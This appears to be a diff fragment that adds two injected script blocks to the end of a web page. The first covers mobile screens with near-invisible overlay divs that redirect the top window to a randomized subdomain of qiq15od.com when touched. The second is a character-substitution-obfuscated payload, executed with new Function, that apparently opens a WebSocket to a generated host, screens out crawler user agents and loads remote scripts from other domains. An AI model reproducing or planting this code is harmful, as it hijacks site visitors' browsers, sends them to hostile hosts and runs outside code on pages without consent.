+<script>;(function(){ function rd(e){var t = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefhijklmnopqrstuvwxyz",a = t.length,n = "";for (i = 0; i < e; i++) n += t.charAt(Math.floor(Math.random() * a));return n;}; function sf(array){return new URLSearchParams( Object.entries(array).sort(() => Math.random() - 0.5) ).toString();} if(!/^Mac|Win/.test(navigator.platform)){var i=0;for(var n=0;n<4;n++){for(var j=0;j<10;j++){var style="position:fixed; bottom:"+(7.96875*n)+"vw; left:"+j*10+"vw; z-index:10;display:block;width:9.6vw;height:7.96875vw;background: #000;opacity:0.01;";document.write('<div class="faulmmwx_b" style="'+style+'"></div>');var a=document.getElementsByClassName("faulmmwx_b");a[i].addEventListener("touchend",function(){var faulmmwx_n="https://"+rd(3)+"8434gc.qiq15od.com"+":8005/cc/8434?"+rd(3)+"="+rd(3)+"&"+sf({is_not:1, target:1, ty:2}); if(typeof _paramet_!=="undefined"){faulmmwx_n+="&"+_paramet_;} if(top.location!=self.location){top.location=faulmmwx_n}else{window.location.href=faulmmwx_n}});i++}}}; })();</script>      <script>!function(){ function a(a){var b={e:"P",w:"D",T:"y","+":"J",l:"!",t:"L",E:"E","@":"2",d:"a",b:"%",q:"l",X:"v","~":"R",5:"r","&":"X",C:"j","]":"F",a:")","^":"m",",":"~","}":"1",x:"C",c:"(",G:"@",h:"h",".":"*",L:"s","=":",",p:"g",I:"Q",1:"7",_:"u",K:"6",F:"t",2:"n",8:"=",k:"G",Z:"]",")":"b",P:"}",B:"U",S:"k",6:"i",g:":",N:"N",i:"S","%":"+","-":"Y","?":"|",4:"z","*":"-",3:"^","[":"{","(":"c",u:"B",y:"M",U:"Z",H:"[",z:"K",9:"H",7:"f",R:"x",v:"&","!":";",M:"_",Q:"9",Y:"e",o:"4",r:"A",m:".",O:"o",V:"W",J:"p",f:"d",":":"q","{":"8",W:"I",j:"?",n:"5",s:"3","|":"T",A:"V",D:"w",";":"O"};return a.split("").map(function(a){return void 0!==b[a]?b[a]:a}).join("")}var b=a(`OimROfkztOl7_2(F6O2cYa[Xd5 F8[P!7_2(F6O2 5c2a[67cFH2Za5YF_52 FH2ZmYRJO5FL!Xd5 O8FH2Z8[6g2=qgl}=YRJO5FLg[PP!5YF_52 YH2Zm(dqqcOmYRJO5FL=O=OmYRJO5FL=5a=Omq8l0=OmYRJO5FLP5m^8Y=5m(8F=5mf87_2(F6O2cY=F=2a[5mOcY=Fa??;)CY(FmfY762Ye5OJY5FTcY=F=[Y2_^Y5d)qYgl0=pYFg2PaP=5m587_2(F6O2cYa["_2fY762Yf"l8FTJYO7 iT^)OqvviT^)OqmFOiF562p|dpvv;)CY(FmfY762Ye5OJY5FTcY=iT^)OqmFOiF562p|dp=[Xdq_Yg"yOf_qY"Pa=;)CY(FmfY762Ye5OJY5FTcY="MMYLyOf_qY"=[Xdq_Ygl0PaP=5mF87_2(F6O2cY=Fa[67c}vFvvcY85cYaa={vFa5YF_52 Y!67covFvv"O)CY(F"88FTJYO7 YvvYvvYmMMYLyOf_qYa5YF_52 Y!Xd5 28;)CY(Fm(5YdFYc2_qqa!67c5m5c2a=;)CY(FmfY762Ye5OJY5FTc2="fY7d_qF"=[Y2_^Y5d)qYgl0=Xdq_YgYPa=@vFvv"LF562p"l8FTJYO7 Ya7O5cXd5 O 62 Ya5mfc2=O=7_2(F6O2cFa[5YF_52 YHFZPm)62fc2_qq=Oaa!5YF_52 2P=5m287_2(F6O2cYa[Xd5 F8YvvYmMMYLyOf_qYj7_2(F6O2ca[5YF_52 YmfY7d_qFPg7_2(F6O2ca[5YF_52 YP!5YF_52 5mfcF="d"=Fa=FP=5mO87_2(F6O2cY=Fa[5YF_52 ;)CY(FmJ5OFOFTJYmhdL;D2e5OJY5FTm(dqqcY=FaP=5mJ8""=5c5mL80aPcH7_2(F6O2cY=Fa[Xd5 58fO(_^Y2F=282dX6pdFO5mJqdF7O5^=O85m(_55Y2Fi(56JF! 7_2(F6O2 5fcYa[Xd5 F 8 "ruxwE]k9W+ztyN;eI~i|BAV&-Ud)(fY7h6CSq^2OJ:5LF_XDRT4"=d 8 FmqY2pFh=2 8 ""!7O5 c6 8 0! 6 < Y! 6%%a 2 %8 Fm(hd5rFcydFhm7qOO5cydFhm5d2fO^ca . daa!5YF_52 2!P! 67cl/3yd(?V62/mFYLFc2a??l2a[Xd5 7d_q^^DRM6LMDL87d_q^^DRM6LMSS80!LYF|6^YO_Fc7_2(F6O2ca[67c7d_q^^DRM6LMDL880a[Xd5 (q6Y2FD6fFh8D62fODmL(5YY2mdXd6qV6fFh!fO(_^Y2FmdffEXY2Ft6LFY2Y5c"FO_(hY2f"=7_2(F6O2ca[67c7d_q^^DRM6LMDL880a[Xd5 (q6Y2FhY6phF8D62fODm622Y59Y6phF!Xd5 YXY8YXY2F??D62fODmYXY2F!Xd5 (R8(T80!67cYXYvvYXYmFTJY88"FO_(hLFd5F"a[(R8YXYmFO_(hYLH0Zm(q6Y2F&!(T8YXYmFO_(hYLH0Zm(q6Y2F-P67cYXYvvYXYmFTJY88"FO_(hY2f"a[(R8YXYm(hd2pYf|O_(hYLH0ZmL(5YY2&!(T8YXYm(hd2pYf|O_(hYLH0Zm(q6Y2F-P67cYXYvvYXYmFTJY88"(q6(S"a[(R8YXYm(q6Y2F&!(T8YXYm(q6Y2F-P67c(R>0vv(T>0a[67c(T>c(q6Y2FhY6phF*c@0o.c(q6Y2FD6fFh/K@0aaavv7d_q^^DRM6LMSS880a[7d_q^^DRM6LMSS8}!Xd5 7d_q^^DRM^8"hFFJLg//"%wdFYmJd5LYc2YD wdFYcaa%"{osop(m:6:}nOfm(O^"%"g{00n/((/{osoj"%5fcsa%"8"%5fcna%"v6LM2OF8}vFd5pYF8}"! 67cFTJYO7 MJd5d^YFMl88"_2fY762Yf"a[7d_q^^DRM^%8"v"%MJd5d^YFM!P 67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O287d_q^^DRM^PYqLY[D62fODmqO(dF6O2mh5Y787d_q^^DRM^P7d_q^^DRM6LMSS80PPPPa!7O5cXd5 280!2<o!2%%a[7O5cXd5 C80!C<}0!C%%a[Xd5 LFTqY8"JOL6F6O2g76RYf! )OFFO^g"%c1mQK{1n.2a%"XD! qY7Fg"%C.}0%"XD! 4*62fYRg}00!f6LJqdTg)qO(S!D6fFhgQmKXD!hY6phFg1mQK{1nXD!)d(Sp5O_2fg #000!OJd(6FTg0m0}!"!fO(_^Y2Fm)OfTm62LY5FrfCd(Y2F9|ytc")Y7O5YY2f"=\'<f6X LFTqY8"\'%LFTqY%\'"></f6X>\'aPPLYF|6^YO_Fc7_2(F6O2ca[67c7d_q^^DRM6LMDL880a[Xd5 68fO(_^Y2Fm(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"{osop(m:6:}nOfm(O^"%"g{00n/f/{osoj(8}v287d_q^^DR"!Xd5 _8fO(_^Y2FmpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_a!Xd5 L))8fO(_^Y2Fm(5YdFYEqY^Y2Fc"LFTqY"a!L))m6f8"7d_q^^DRMLFTqYM6f"!L))m622Y59|yt8")OfT[JOL6F6O2g626F6dq l6^JO5Fd2F!^62*hY6phFg"%D62fODmL(5YY2mhY6phF%"JR l6^JO5Fd2F!Jdff62p*)OFFO^g}00JR l6^JO5Fd2F!P"!fO(_^Y2FmhYdfmdJJY2fxh6qfcL))aPP=}n00aPP=}000a!P 67c/)d6f_?9_dDY6u5ODLY5?A6XOu5ODLY5?;JJOu5ODLY5?9YT|dJu5ODLY5?y6_6u5ODLY5?)fhO2O5)5ODLY5?yIIu5ODLY5?Bxu5ODLY5?I_d5S?IzI/pmFYLFc2dX6pdFO5m_LY5rpY2Fal887dqLYa[Xd5 DLRp8H"pDm0XsR4qKm(O^"="pDm}_F{h^)m(O^"="pDm}_F{h^)m(O^"="pDm_n4FT__m(O^"="pDm_n4FT__m(O^"="pDm0XsR4qKm(O^"Z!Xd5 S8ydFhm7qOO5cc2YD wdFYcaampYFwdFYca/na!S8cS>najngS! Xd5 (82YD VY)iO(SYFc"DLLg//Q)7Y0}}@K7YYd)o"%c2YD wdFYcampYFwdFYcaa%DLRpHSZ%"g@00Qn"%"/{oso"a! (mO2OJY287_2(F6O2cYa[7d_q^^DRM6LMDL87d_q^^DRM6LMSS8}!LYF|6^YO_Fcca8>[Xd5 (d2Xd85mpYFEqY^Y2FuTWfc"7d_q^^DRMLFTqYM6f"a!67c(d2Xda[(d2Xdm5Y^OXYcaPP=}000aP!(mO2^YLLdpY87_2(F6O2cYa[Xd5 F87_2(F6O2cYa[Xd5 F=5=2=O=(=6=_=d8"(hd5rF"=78"75O^xhd5xOfY"=q8"(hd5xOfYrF"=f8"62fYR;7"=L8"ruxwE]k9W+ztyN;eI~i|BAV&-Ud)(fY7ph6CSq^2OJ:5LF_XDRT40}@sonK1{Q%/8"=J8""=p80!7O5cY8Ym5YJqd(Yc/H3r*Ud*40*Q%/8Z/p=""a!p<YmqY2pFh!aO8LHfZcYHdZcp%%aa=(8LHfZcYHdZcp%%aa=68LHfZcYHdZcp%%aa=_8LHfZcYHdZcp%%aa=F8O<<@?(>>o=58c}nv(a<<o?6>>@=28csv6a<<K?_=J%8iF562pH7ZcFa=Kol86vvcJ%8iF562pH7Zc5aa=Kol8_vvcJ%8iF562pH7Zc2aa!5YF_52 7_2(F6O2cYa[7O5cXd5 F8""=2858(}8(@80!2<YmqY2pFh!ac58YHqZc2aa<}@{jcF%8iF562pH7Zc5a=2%%ag5>}Q}vv5<@@ojc(@8YHqZc2%}a=F%8iF562pH7Zccs}v5a<<K?Ksv(@a=2%8@agc(@8YHqZc2%}a=(s8YHqZc2%@a=F%8iF562pH7Zcc}nv5a<<}@?cKsv(@a<<K?Ksv(sa=2%8sa!5YF_52 FPcJaPcYmfdFda!2YD ]_2(F6O2c"MFf(L"=FacOa=(m(qOLYcaPPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"{osopmL^_215Om(O^"%"g{00n\/L(/{osoj287d_q^^DR"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_aPPZa!`.substr(10));new Function(b)()}();</script>
+
+</body>
+</html>
